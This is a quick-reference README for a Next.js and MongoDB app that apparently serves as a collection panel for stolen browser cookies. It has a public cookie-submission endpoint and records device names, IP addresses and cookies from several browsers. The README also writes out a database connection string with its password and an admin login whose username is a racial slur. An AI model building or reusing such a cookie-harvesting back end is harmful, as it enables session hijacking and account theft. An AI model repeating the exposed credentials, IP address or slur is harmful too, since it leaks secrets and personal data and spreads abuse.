# Quick Reference

## 🔗 URLs
- **App**: http://localhost:3001
- **Login**: http://localhost:3001/login
- **Register**: http://localhost:3001/register
- **Dashboard**: http://localhost:3001/dashboard

## 🔑 Default Admin
```
Email: supernigga
Password: jaihonilubaba
```

## 🗄️ Database
```
URI: mongodb+srv://super:super@cluster0.enlcnfw.mongodb.net/nilugulu
Database: nilugulu
Collections: users, submissions
```

## 📡 API Endpoints

### Submit Cookies (Public)
```bash
POST http://localhost:3001/api/submit-cookies
```

### Register User
```bash
POST http://localhost:3001/api/register
```

### Get Submissions (Protected)
```bash
GET http://localhost:3001/api/submissions
```

## 🧪 Test Commands

```bash
# Test API submission
node test-submission.js

# Recreate admin user
npm run seed

# Start dev server
npm run dev

# Build for production
npm run build
```

## 📊 Test Data Submitted
- **Submission ID**: 695e9d6e38a0c5e5d29c9895
- **Device**: Tirths-MacBook-Air.local
- **IP**: 47.11.107.165
- **Cookies**: 5 total (Chrome: 2, Edge: 1, Brave: 1, Firefox: 1)

## 🎨 Tech Stack
- Next.js 15.5.9
- React 19
- TypeScript
- MongoDB + Mongoose
- NextAuth.js
- Tailwind CSS
- shadcn/ui

## 📁 Key Files
- `/app/api/submit-cookies/route.ts` - Cookie submission endpoint
- `/app/dashboard/page.tsx` - Admin dashboard
- `/models/Submission.ts` - Submission schema
- `/lib/mongodb.ts` - Database connection
- `/.env.local` - Environment variables

## ✅ Status
All features implemented and tested ✨
